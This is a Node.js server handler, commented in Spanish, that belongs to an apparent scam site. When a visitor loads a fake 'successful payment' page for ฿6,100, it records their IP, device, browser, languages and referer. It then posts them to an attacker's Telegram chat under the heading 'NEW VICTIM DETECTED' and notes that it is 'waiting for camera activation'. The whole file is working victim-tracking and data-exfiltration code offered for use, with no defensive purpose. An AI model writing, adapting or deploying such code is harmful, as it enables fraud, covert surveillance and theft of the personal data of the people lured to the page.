const fs = require('fs');
const path = require('path');

// Función para enviar a Telegram
async function sendToTelegram(message) {
  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
  
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log('Telegram no configurado:', message);
    return;
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
    
    if (response.ok) {
      console.log('Mensaje enviado a Telegram');
    }
  } catch (error) {
    console.error('Error enviando a Telegram:', error);
  }
}

module.exports = async (req, res) => {
  // Solo responder a GET requests para la página principal
  if (req.method !== 'GET') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  // Obtener TODA la información posible
  const ip = req.headers['x-forwarded-for'] || 
             req.headers['x-real-ip'] || 
             req.connection?.remoteAddress || 
             req.socket?.remoteAddress ||
             req.connection?.socket?.remoteAddress ||
             'unknown';
             
  const userAgent = req.headers['user-agent'] || 'unknown';
  const referer = req.headers['referer'] || 'Directo';
  const acceptLanguage = req.headers['accept-language'] || 'unknown';
  const acceptEncoding = req.headers['accept-encoding'] || 'unknown';
  const origin = req.headers['origin'] || 'unknown';
  const timestamp = new Date().toLocaleString('es-ES', { timeZone: 'Europe/Madrid' });

  // Analizar User Agent para más detalles
  let deviceType = 'Unknown';
  let os = 'Unknown';
  let browser = 'Unknown';

  if (userAgent.includes('Mobile') || userAgent.includes('Android')) deviceType = '📱 Móvil';
  else if (userAgent.includes('Tablet') || userAgent.includes('iPad')) deviceType = '📱 Tablet';
  else deviceType = '💻 Desktop';

  if (userAgent.includes('Windows')) os = 'Windows';
  else if (userAgent.includes('Mac')) os = 'macOS';
  else if (userAgent.includes('Linux')) os = 'Linux';
  else if (userAgent.includes('Android')) os = 'Android';
  else if (userAgent.includes('iOS')) os = 'iOS';

  if (userAgent.includes('Chrome')) browser = 'Chrome';
  else if (userAgent.includes('Firefox')) browser = 'Firefox';
  else if (userAgent.includes('Safari')) browser = 'Safari';
  else if (userAgent.includes('Edge')) browser = 'Edge';

  // Enviar notificación completa a Telegram
  const message = `🎯 <b>NUEVA VÍCTIMA DETECTADA</b>

📍 <b>IP:</b> <code>${ip}</code>
${deviceType} <b>Dispositivo:</b> ${os}
🌐 <b>Navegador:</b> ${browser}
🗣️ <b>Idiomas:</b> ${acceptLanguage}
🔗 <b>Origen:</b> ${referer}
⏰ <b>Hora:</b> ${timestamp}
💰 <b>Monto:</b> ฿6,100.00

📋 <b>User Agent:</b>
<code>${userAgent}</code>

🔍 Víctima viendo página de "pago exitoso"
⚠️ Esperando activación de cámara...`;

  // Enviar a Telegram de forma asíncrona
  sendToTelegram(message).catch(console.error);

  // Log en consola
  console.log(`[${timestamp}] PAGE_ACCESS from ${ip}`);

  // Leer y servir el archivo HTML
  try {
    const htmlPath = path.join(process.cwd(), 'public', 'index.html');
    const htmlContent = fs.readFileSync(htmlPath, 'utf8');
    
    res.setHeader('Content-Type', 'text/html');
    return res.status(200).send(htmlContent);
  } catch (error) {
    console.error('Error serving HTML:', error);
    return res.status(500).json({ error: 'Internal server error' });
  }
}; 